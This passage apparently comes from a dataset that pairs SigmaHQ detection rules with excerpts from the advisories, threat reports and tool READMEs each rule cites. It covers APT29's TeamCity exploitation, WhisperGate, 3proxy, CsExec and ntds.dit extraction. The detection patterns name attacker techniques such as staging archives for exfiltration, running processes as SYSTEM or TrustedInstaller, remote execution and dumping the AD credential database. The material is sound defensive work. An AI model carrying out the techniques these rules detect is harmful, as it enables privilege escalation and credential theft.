          "id": "71ff406e-b633-4989-96ec-bc49d825a412",
          "type": "similar"
        },
        {
          "id": "daf7eb81-35fd-410d-9d7a-657837e602bb",
          "type": "similar"
        },
        {
          "id": "b7a3c9a3-09ea-4934-8864-6a32cacd98d9",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\nAn adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md",
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2021-07-20",
      "modified": "2022-10-09",
      "tags": [
        "attack.collection",
        "attack.t1074.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "Compress-Archive -Path*-DestinationPath $env:TEMP",
            "Compress-Archive -Path*-DestinationPath*\\AppData\\Local\\Temp\\",
            "Compress-Archive -Path*-DestinationPath*:\\Windows\\Temp\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_zip_compress.yml"
  },
  "375": {
    "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
    "markdown": "# Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally **Release Date**: December 13, 2023 **Alert Code**: AA23-347A **Related topics**: Nation-State Cyber Actors, Cyber Threats and Advisories, Securing Networks --- ## SUMMARY The U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a large scale, targeting servers hosting JetBrains",
    "sigma_rule": {
      "title": "Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet",
      "id": "85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98",
      "related": [
        {
          "id": "71ff406e-b633-4989-96ec-bc49d825a412",
          "type": "similar"
        },
        {
          "id": "daf7eb81-35fd-410d-9d7a-657837e602bb",
          "type": "similar"
        },
        {
          "id": "b7a3c9a3-09ea-4934-8864-6a32cacd98d9",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\nAn adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md",
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2021-07-20",
      "modified": "2022-10-09",
      "tags": [
        "attack.collection",
        "attack.t1074.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "Compress-Archive -Path*-DestinationPath $env:TEMP",
            "Compress-Archive -Path*-DestinationPath*\\AppData\\Local\\Temp\\",
            "Compress-Archive -Path*-DestinationPath*:\\Windows\\Temp\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_zip_compress.yml"
  },
  "376": {
    "url": "https://github.com/3proxy/3proxy",
    "markdown": "# 3APA3A 3proxy tiny proxy server ## Branches: - Master (stable) branch - 3proxy 0.9 - Devel branch - 3proxy 10 ## Download: - Binaries for released (master) versions (Windows, Linux): https://github.com/z3APA3A/3proxy/releases - Binaries for devel version (Windows, Linux): https://3proxy.org/download/devel/ - Docker images: https://hub.docker.com/repository/docker/3proxy/3proxy - Archive of old versions: https://github.com/z3APA3A/3proxy-archive ## Windows installation: ``` 3proxy --install ``` - Installs and starts proxy as Windows service (config file should be located in the same directory) ``` 3proxy --remove ``` - Removes the service (should be stopped before via `net stop 3proxy`). ## Linux build instructions: To build in Linux, install `git`",
    "sigma_rule": {
      "title": "PUA - 3Proxy Execution",
      "id": "f38a82d2-fba3-4781-b549-525efbec8506",
      "status": "test",
      "description": "Detects the use of 3proxy, a tiny free proxy server",
      "references": [
        "https://github.com/3proxy/3proxy",
        "https://blog.talosintelligence.com/2022/09/lazarus-three-rats.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-09-13",
      "modified": "2023-02-21",
      "tags": [
        "attack.command-and-control",
        "attack.t1572"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": "\\3proxy.exe"
        },
        "selection_pe": {
          "Description": "3proxy - tiny proxy server"
        },
        "selection_params": {
          "CommandLine|contains": ".exe -i127.0.0.1 -p"
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_3proxy_execution.yml"
  },
  "377": {
    "url": "https://blog.talosintelligence.com/2022/09/lazarus-three-rats.html",
    "markdown": "# Lazarus and the tale of three RATs **September 8, 2022** Threat Spotlight - Cisco Talos has been tracking a new campaign operated by the Lazarus APT group, attributed to North Korea by the United States government. - This campaign involved the exploitation of vulnerabilities in VMWare Horizon to gain an initial foothold into targeted organizations. - Targeted organizations include energy providers from around the world, including those headquartered in the United States, Canada, and Japan. - The campaign is meant to infiltrate organizations around the world for establishing long-term access and subsequently exfiltrating data of interest to the adversary's",
    "sigma_rule": {
      "title": "PUA - 3Proxy Execution",
      "id": "f38a82d2-fba3-4781-b549-525efbec8506",
      "status": "test",
      "description": "Detects the use of 3proxy, a tiny free proxy server",
      "references": [
        "https://github.com/3proxy/3proxy",
        "https://blog.talosintelligence.com/2022/09/lazarus-three-rats.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-09-13",
      "modified": "2023-02-21",
      "tags": [
        "attack.command-and-control",
        "attack.t1572"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": "\\3proxy.exe"
        },
        "selection_pe": {
          "Description": "3proxy - tiny proxy server"
        },
        "selection_params": {
          "CommandLine|contains": ".exe -i127.0.0.1 -p"
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_3proxy_execution.yml"
  },
  "378": {
    "url": "https://twitter.com/splinter_code/status/1483815103279603714",
    "markdown": "# Post Jan 19, 2022 Nice analysis about #WhisperGate with wide coverage over all the attack chain. As an additional bit of information, they leverage the utility AdvancedRun with the flag /Runas 8 in order to spawn a new process with a token containing the \"TrustedInstaller\" SID in the groups. ## Post Jan 19, 2022 We did a deep dive on the #WhisperGate #BleedingBear malware samples. New details on process hollowing technique used by the stage3 injector and method to terminate Windows Defender https://elastic.github.io/security-research/malware/2022/01/01.operation-bleeding-bear/article/ ## Comment Jan 19, 2022 This allows them to disable the Windows Defender service through the",
    "sigma_rule": {
      "title": "PUA - AdvancedRun Execution",
      "id": "d2b749ee-4225-417e-b20e-a8d2193cbb84",
      "related": [
        {
          "id": "fa00b701-44c6-4679-994d-5a18afa8a707",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of AdvancedRun utility",
      "references": [
        "https://twitter.com/splinter_code/status/1483815103279603714",
        "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
        "https://www.elastic.co/security-labs/operation-bleeding-bear",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-20",
      "modified": "2023-02-21",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1564.003",
        "attack.t1134.002",
        "attack.t1059.003"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": "AdvancedRun.exe"
          },
          {
            "CommandLine|contains|all": [
              " /EXEFilename ",
              " /Run"
            ]
          },
          {
            "CommandLine|contains|all": [
              " /WindowState 0",
              " /RunAs ",
              " /CommandLine "
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_advancedrun.yml"
  },
  "379": {
    "url": "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
    "markdown": "# Analysis of Destructive Malware (WhisperGate) targeting Ukraine BLKSMTH | S2W TALON ## Executive Summary - **2022–01–15**, MSTIC (Microsoft Threat Intelligence Center) identified and unveiled a cyberattack targeting Ukrainian organizations with “**WhisperGate**” which overwrites Master Boot Record (MBR) and files. ``` An actor who conducted this attack tracked as DEV-0586 and has not yet been attributed to existing groups. ``` - It was confirmed that the actor uses a tool “Impacket” to perform `lateral movement` and `malware execution`. ``` Known working paths: C:\\PerfLogs, C:\\ProgramData, C:\\, C:\\temp ``` - The flow consisting of a total of three stages revealed so far",
    "sigma_rule": {
      "title": "PUA - AdvancedRun Execution",
      "id": "d2b749ee-4225-417e-b20e-a8d2193cbb84",
      "related": [
        {
          "id": "fa00b701-44c6-4679-994d-5a18afa8a707",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of AdvancedRun utility",
      "references": [
        "https://twitter.com/splinter_code/status/1483815103279603714",
        "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
        "https://www.elastic.co/security-labs/operation-bleeding-bear",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-20",
      "modified": "2023-02-21",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1564.003",
        "attack.t1134.002",
        "attack.t1059.003"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": "AdvancedRun.exe"
          },
          {
            "CommandLine|contains|all": [
              " /EXEFilename ",
              " /Run"
            ]
          },
          {
            "CommandLine|contains|all": [
              " /WindowState 0",
              " /RunAs ",
              " /CommandLine "
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_advancedrun.yml"
  },
  "380": {
    "url": "https://www.elastic.co/security-labs/operation-bleeding-bear",
    "markdown": "# Operation Bleeding Bear **6 December 2022** Elastic Security verifies new destructive malware targeting Ukraine: Operation Bleeding Bear - **Category:** Campaigns ## Key Takeaways - Elastic Security provides new analysis and insights into a targeted campaign against Ukrainian organizations with destructive malware reported over the weekend of Jan 15, 2022. - Techniques observed include process hollowing, tampering with Windows Defender, using a Master Boot Record (MBR) wiper, and a file corruptor component. - Elastic Security prevents each stage of the described campaign using prebuilt endpoint protection features. ```image Alt: Operation Bleeding Bear Image Description: The image is a flowchart detailing",
    "sigma_rule": {
      "title": "PUA - AdvancedRun Execution",
      "id": "d2b749ee-4225-417e-b20e-a8d2193cbb84",
      "related": [
        {
          "id": "fa00b701-44c6-4679-994d-5a18afa8a707",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of AdvancedRun utility",
      "references": [
        "https://twitter.com/splinter_code/status/1483815103279603714",
        "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
        "https://www.elastic.co/security-labs/operation-bleeding-bear",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-20",
      "modified": "2023-02-21",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1564.003",
        "attack.t1134.002",
        "attack.t1059.003"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": "AdvancedRun.exe"
          },
          {
            "CommandLine|contains|all": [
              " /EXEFilename ",
              " /Run"
            ]
          },
          {
            "CommandLine|contains|all": [
              " /WindowState 0",
              " /RunAs ",
              " /CommandLine "
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_advancedrun.yml"
  },
  "381": {
    "url": "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/",
    "markdown": "# How to Run a Program as SYSTEM (LocalSystem) Account in Windows _Last Updated on: May 18, 2021_ Many Windows system files, registry keys, and services are owned by the `SYSTEM` (a.k.a LocalSystem) account, which has a high privilege level. If you need to modify a registry key owned by the `SYSTEM` account, there are at least two options. The first option that comes to your mind is to take ownership of the corresponding registry key, assign yourself Full Control permissions. Once the registry key or the values are updated, revert the permissions and ownership to `SYSTEM`. There is, however,",
    "sigma_rule": {
      "title": "PUA - AdvancedRun Execution",
      "id": "d2b749ee-4225-417e-b20e-a8d2193cbb84",
      "related": [
        {
          "id": "fa00b701-44c6-4679-994d-5a18afa8a707",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of AdvancedRun utility",
      "references": [
        "https://twitter.com/splinter_code/status/1483815103279603714",
        "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
        "https://www.elastic.co/security-labs/operation-bleeding-bear",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-20",
      "modified": "2023-02-21",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1564.003",
        "attack.t1134.002",
        "attack.t1059.003"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": "AdvancedRun.exe"
          },
          {
            "CommandLine|contains|all": [
              " /EXEFilename ",
              " /Run"
            ]
          },
          {
            "CommandLine|contains|all": [
              " /WindowState 0",
              " /RunAs ",
              " /CommandLine "
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_advancedrun.yml"
  },
  "382": {
    "url": "https://twitter.com/splinter_code/status/1483815103279603714",
    "markdown": "# Post Jan 19, 2022 Nice analysis about #WhisperGate with wide coverage over all the attack chain. As an additional bit of information, they leverage the utility AdvancedRun with the flag /Runas 8 in order to spawn a new process with a token containing the \"TrustedInstaller\" SID in the groups. ## Post Jan 19, 2022 We did a deep dive on the #WhisperGate #BleedingBear malware samples. New details on process hollowing technique used by the stage3 injector and method to terminate Windows Defender https://elastic.github.io/security-research/malware/2022/01/01.operation-bleeding-bear/article/ ## Comment Jan 19, 2022 This allows them to disable the Windows Defender service through the",
    "sigma_rule": {
      "title": "PUA - AdvancedRun Suspicious Execution",
      "id": "fa00b701-44c6-4679-994d-5a18afa8a707",
      "related": [
        {
          "id": "d2b749ee-4225-417e-b20e-a8d2193cbb84",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of AdvancedRun utility in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts",
      "references": [
        "https://twitter.com/splinter_code/status/1483815103279603714",
        "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
        "https://www.elastic.co/security-labs/operation-bleeding-bear",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-20",
      "modified": "2023-02-21",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1134.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "/EXEFilename",
            "/CommandLine"
          ]
        },
        "selection_runas": [
          {
            "CommandLine|contains": [
              " /RunAs 8 ",
              " /RunAs 4 ",
              " /RunAs 10 ",
              " /RunAs 11 "
            ]
          },
          {
            "CommandLine|endswith": [
              "/RunAs 8",
              "/RunAs 4",
              "/RunAs 10",
              "/RunAs 11"
            ]
          }
        ],
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_advancedrun_priv_user.yml"
  },
  "383": {
    "url": "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
    "markdown": "# Analysis of Destructive Malware (WhisperGate) targeting Ukraine BLKSMTH | S2W TALON ## Executive Summary - **2022–01–15**, MSTIC (Microsoft Threat Intelligence Center) identified and unveiled a cyberattack targeting Ukrainian organizations with “**WhisperGate**” which overwrites Master Boot Record (MBR) and files. ``` An actor who conducted this attack tracked as DEV-0586 and has not yet been attributed to existing groups. ``` - It was confirmed that the actor uses a tool “Impacket” to perform `lateral movement` and `malware execution`. ``` Known working paths: C:\\PerfLogs, C:\\ProgramData, C:\\, C:\\temp ``` - The flow consisting of a total of three stages revealed so far",
    "sigma_rule": {
      "title": "PUA - AdvancedRun Suspicious Execution",
      "id": "fa00b701-44c6-4679-994d-5a18afa8a707",
      "related": [
        {
          "id": "d2b749ee-4225-417e-b20e-a8d2193cbb84",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of AdvancedRun utility in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts",
      "references": [
        "https://twitter.com/splinter_code/status/1483815103279603714",
        "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
        "https://www.elastic.co/security-labs/operation-bleeding-bear",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-20",
      "modified": "2023-02-21",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1134.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "/EXEFilename",
            "/CommandLine"
          ]
        },
        "selection_runas": [
          {
            "CommandLine|contains": [
              " /RunAs 8 ",
              " /RunAs 4 ",
              " /RunAs 10 ",
              " /RunAs 11 "
            ]
          },
          {
            "CommandLine|endswith": [
              "/RunAs 8",
              "/RunAs 4",
              "/RunAs 10",
              "/RunAs 11"
            ]
          }
        ],
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_advancedrun_priv_user.yml"
  },
  "384": {
    "url": "https://www.elastic.co/security-labs/operation-bleeding-bear",
    "markdown": "# Operation Bleeding Bear **6 December 2022** Elastic Security verifies new destructive malware targeting Ukraine: Operation Bleeding Bear - **Category:** Campaigns ## Key Takeaways - Elastic Security provides new analysis and insights into a targeted campaign against Ukrainian organizations with destructive malware reported over the weekend of Jan 15, 2022. - Techniques observed include process hollowing, tampering with Windows Defender, using a Master Boot Record (MBR) wiper, and a file corruptor component. - Elastic Security prevents each stage of the described campaign using prebuilt endpoint protection features. ```image Alt: Operation Bleeding Bear Image Description: The image is a flowchart detailing",
    "sigma_rule": {
      "title": "PUA - AdvancedRun Suspicious Execution",
      "id": "fa00b701-44c6-4679-994d-5a18afa8a707",
      "related": [
        {
          "id": "d2b749ee-4225-417e-b20e-a8d2193cbb84",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of AdvancedRun utility in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts",
      "references": [
        "https://twitter.com/splinter_code/status/1483815103279603714",
        "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
        "https://www.elastic.co/security-labs/operation-bleeding-bear",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-20",
      "modified": "2023-02-21",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1134.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "/EXEFilename",
            "/CommandLine"
          ]
        },
        "selection_runas": [
          {
            "CommandLine|contains": [
              " /RunAs 8 ",
              " /RunAs 4 ",
              " /RunAs 10 ",
              " /RunAs 11 "
            ]
          },
          {
            "CommandLine|endswith": [
              "/RunAs 8",
              "/RunAs 4",
              "/RunAs 10",
              "/RunAs 11"
            ]
          }
        ],
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_advancedrun_priv_user.yml"
  },
  "385": {
    "url": "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/",
    "markdown": "# How to Run a Program as SYSTEM (LocalSystem) Account in Windows _Last Updated on: May 18, 2021_ Many Windows system files, registry keys, and services are owned by the `SYSTEM` (a.k.a LocalSystem) account, which has a high privilege level. If you need to modify a registry key owned by the `SYSTEM` account, there are at least two options. The first option that comes to your mind is to take ownership of the corresponding registry key, assign yourself Full Control permissions. Once the registry key or the values are updated, revert the permissions and ownership to `SYSTEM`. There is, however,",
    "sigma_rule": {
      "title": "PUA - AdvancedRun Suspicious Execution",
      "id": "fa00b701-44c6-4679-994d-5a18afa8a707",
      "related": [
        {
          "id": "d2b749ee-4225-417e-b20e-a8d2193cbb84",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of AdvancedRun utility in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts",
      "references": [
        "https://twitter.com/splinter_code/status/1483815103279603714",
        "https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3",
        "https://www.elastic.co/security-labs/operation-bleeding-bear",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-20",
      "modified": "2023-02-21",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1134.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "/EXEFilename",
            "/CommandLine"
          ]
        },
        "selection_runas": [
          {
            "CommandLine|contains": [
              " /RunAs 8 ",
              " /RunAs 4 ",
              " /RunAs 10 ",
              " /RunAs 11 "
            ]
          },
          {
            "CommandLine|endswith": [
              "/RunAs 8",
              "/RunAs 4",
              "/RunAs 10",
              "/RunAs 11"
            ]
          }
        ],
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_advancedrun_priv_user.yml"
  },
  "386": {
    "url": "https://github.com/malcomvetter/CSExec",
    "markdown": "# CSExec (a C Sharp psexec implementation) This is an example for how to implement `psexec` (from SysInternals Suite) functionality, but in open source C#. This does not implement all of the psexec functionality, but it does implement the equivalent functionality to running: `psexec -s \\\\target-host cmd.exe` ```image Alt: screenshot Description: The image displays a command prompt interface showing the execution of the `csexec.exe` tool. It includes the results of a ping command to a target machine (dc0) followed by the output of the `csexec` execution, which details the hostname, .NET version found, and the service installation process. The commands",
    "sigma_rule": {
      "title": "PUA - CsExec Execution",
      "id": "d08a2711-ee8b-4323-bdec-b7d85e892b31",
      "status": "test",
      "description": "Detects the use of the lesser known remote execution tool named CsExec a PsExec alternative",
      "references": [
        "https://github.com/malcomvetter/CSExec",
        "https://www.microsoft.com/en-us/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-08-22",
      "modified": "2023-02-21",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001",
        "attack.execution",
        "attack.t1569.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\csexec.exe"
        },
        "selection_pe": {
          "Description": "csexec"
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_csexec.yml"
  },
  "387": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/",
    "markdown": "# Ransomware as a service: Understanding the cybercrime gig economy and how to protect yourself **Published**: May 9, 2022 [Image Details: **Alt Text**: Ransomware as a service **Description**: The image depicts a cyber threat intelligence briefing in a modern workspace. A presenter is pointing at a large digital display that features a world map with various data points and graphs indicating global threat status. The presenter is standing in front of a screen with detailed information, while two additional screens show exposure distribution and threat details. The overall setting suggests a professional environment focused on analyzing cyber threats, with multiple",
    "sigma_rule": {
      "title": "PUA - CsExec Execution",
      "id": "d08a2711-ee8b-4323-bdec-b7d85e892b31",
      "status": "test",
      "description": "Detects the use of the lesser known remote execution tool named CsExec a PsExec alternative",
      "references": [
        "https://github.com/malcomvetter/CSExec",
        "https://www.microsoft.com/en-us/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-08-22",
      "modified": "2023-02-21",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001",
        "attack.execution",
        "attack.t1569.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\csexec.exe"
        },
        "selection_pe": {
          "Description": "csexec"
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_csexec.yml"
  },
  "388": {
    "url": "https://thedfirreport.com/2020/06/21/snatch-ransomware/",
    "markdown": "# Snatch Ransomware **Categories:** Meterpreter, ransomware, rdp, yara **Published on:** June 21, 2020 Another RDP brute force ransomware strikes again, this time, Snatch Team! Snatch Team was able to go from brute forcing a Domain Administrator (DA) account via RDP, to running a Meterpreter reverse shell and a RDP proxy via Tor on a Domain Controller (DC), to encrypting all Domain joined systems in under 5 hours. ```image Alt: Snatch Ransomware Event UTC Description: The image titled 'Snach Ransomware Event' provides a timeline and flowchart detailing the steps involved in a ransomware attack by the Snatch Team. It outlines the",
    "sigma_rule": {
      "title": "PUA - DIT Snapshot Viewer",
      "id": "d3b70aad-097e-409c-9df2-450f80dc476b",
      "status": "test",
      "description": "Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.",
      "references": [
        "https://thedfirreport.com/2020/06/21/snatch-ransomware/",
        "https://web.archive.org/web/20201124182207/https://github.com/yosqueoy/ditsnap"
      ],
      "author": "Furkan Caliskan (@caliskanfurkan_)",
      "date": "2020-07-04",
      "modified": "2023-02-21",
      "tags": [
        "attack.credential-access",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\ditsnap.exe"
          },
          {
            "CommandLine|contains": "ditsnap.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate admin usage"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_ditsnap.yml"
  },
  "389": {
    "url": "https://web.archive.org/web/20201124182207/https://github.com/yosqueoy/ditsnap",
    "markdown": "# ditsnap ## Folders and Files - EseDataAccess - VssCopy - ditsnap_exe - images - .gitignore - LISENCE.md - README.md - ditsnap.sln ## README ### DIT Snapshot Viewer DIT Snapshot Viewer is an inspection tool for Active Directory database, `ntds.dit`. This tool connects to ESE (Extensible Storage Engine) and reads tables/records including hidden objects by low level C API. The tool can extract `ntds.dit` file without stopping `lsass.exe`. When Active Directory Service is running, `lsass.exe` locks the file and does not allow access to it. The snapshot wizard copies `ntds.dit` using VSS (Volume Shadow Copy Service) even if the file",
    "sigma_rule": {
      "title": "PUA - DIT Snapshot Viewer",
